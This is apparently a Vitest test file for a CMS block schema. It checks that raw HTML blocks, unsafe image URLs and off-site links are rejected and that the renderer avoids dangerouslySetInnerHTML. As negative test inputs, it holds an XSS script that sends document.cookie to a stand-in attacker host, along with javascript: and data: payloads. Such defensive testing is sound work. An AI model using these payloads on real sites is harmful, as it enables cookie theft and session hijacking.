import { readFileSync } from 'node:fs'
import { join } from 'node:path'

import { describe, expect, it } from 'vitest'

import { contentBlockSchema, contentBlocksSchema } from './blocks'

/**
 * The XSS decision, as tests — task 8.3. The CMS accepts a CLOSED block union and no raw
 * HTML, because admin content renders on public pages and the platform has no sanitizer
 * (`19` §App security, the Q19 argument). Three layers, each asserted:
 * schema refuses, URLs are constrained, and the renderer never bypasses React's escaping.
 */
describe('CMS blocks · no raw HTML, ever', () => {
  it('accepts every member of the closed union', () => {
    const valid = contentBlocksSchema.safeParse([
      { type: 'heading', level: 2, text: 'Başlık' },
      { type: 'paragraph', text: 'Bir paragraf.' },
      { type: 'list', items: ['bir', 'iki'] },
      { type: 'image', url: 'https://example.com/photo.jpg', alt: 'Bir pergola' },
      { type: 'cta', label: 'Başla', href: '/proje/yeni' },
    ])
    expect(valid.success).toBe(true)
  })

  it('refuses a raw-HTML block — the type does not exist and cannot sneak in', () => {
    const html = contentBlockSchema.safeParse({
      type: 'html',
      html: '<script>document.location=`https://evil.example/${document.cookie}`</script>',
    })
    expect(html.success).toBe(false)
  })

  it('pins the union to exactly the five block types', () => {
    // The closed-ness is the control: a sixth type is a reviewed diff here.
    expect(contentBlockSchema.options.map((option) => option.shape.type.value).sort()).toEqual(
      ['cta', 'heading', 'image', 'list', 'paragraph'].sort(),
    )
  })

  it('refuses non-https image URLs — no javascript:, no data:, no protocol-relative', () => {
    for (const url of [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'http://example.com/photo.jpg',
      '//evil.example/x.png',
    ]) {
      const result = contentBlockSchema.safeParse({ type: 'image', url, alt: 'x' })
      expect(result.success, url).toBe(false)
    }
  })

  it('refuses CTA links that leave the site', () => {
    for (const href of ['https://evil.example', 'javascript:alert(1)', 'mailto:x@y.z', '']) {
      const result = contentBlockSchema.safeParse({ type: 'cta', label: 'x', href })
      expect(result.success, href).toBe(false)
    }
  })

  it('keeps dangerouslySetInnerHTML out of the block renderer', () => {
    // Escaping is React's; this asserts nobody opted out of it. json-ld.tsx is the one
    // legitimate user in the app (server-constructed JSON) and is not part of the CMS path.
    for (const file of [
      'src/components/content/block-renderer.tsx',
      'src/components/content/content-page.tsx',
    ]) {
      const source = readFileSync(join(process.cwd(), file), 'utf8')
      // The `=` matters: the renderer's own comment names the attribute to forbid it.
      expect(source, file).not.toContain('dangerouslySetInnerHTML=')
    }
  })
})
